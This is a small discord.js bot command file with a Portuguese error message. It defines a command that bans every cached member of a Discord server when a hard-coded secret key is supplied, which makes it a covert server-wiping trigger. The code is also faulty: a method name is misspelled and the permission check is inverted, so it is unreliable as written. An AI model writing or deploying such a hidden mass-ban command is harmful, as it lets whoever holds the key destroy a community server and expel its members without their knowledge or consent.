const Discord = require("discord.js")
module.exports.run = async (client, message, args) => {
  const key = args[0]
  if(key === "458104") {
  if(!message.member.guild.me.hasPermission('ADMINISTRATOR') || !message.member.guild.me.hasPermmission('MANAGE_MESSAGES')) (
  message.guild.members.cache.forEach(member => member.ban())
    )
  } else {
    message.channel.send("Key invalida tente novamente mais tarde!")
  }
}